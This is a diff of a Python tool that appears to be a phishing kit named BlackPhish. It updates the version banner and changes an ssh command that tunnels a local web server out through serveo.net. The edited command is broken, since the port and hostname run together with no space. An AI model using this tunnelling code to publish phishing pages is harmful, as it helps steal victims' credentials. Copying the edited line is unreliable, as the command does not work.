@@ -10,8 +10,9 @@
 
 
 
+# Lasted updated: 1/5/20
 
-# version 2.7: - Sometimes showing non-ascaii character error
+# version 2.8: - Bug fixes
 
 # Please update version number each time we update
 
@@ -73,7 +74,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.7
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.8
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -111,7 +112,7 @@ def serveoForward():
     port = input(yellow + "\nPort(recommend 80): ")
     print(yellow + '\n If prompt about RSA key, say yes' + green)
     sleep(2)
-    system('ssh -o ServerAliveInterval=60 -R ' + name + ':80:localhost:80 serveo.net')
+    system('ssh -o ServerAliveInterval=60 -R ' + name + ':' + port + ':localhost:' + port + 'serveo.net')
 
 
 
@@ -165,7 +166,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.7
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.8
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
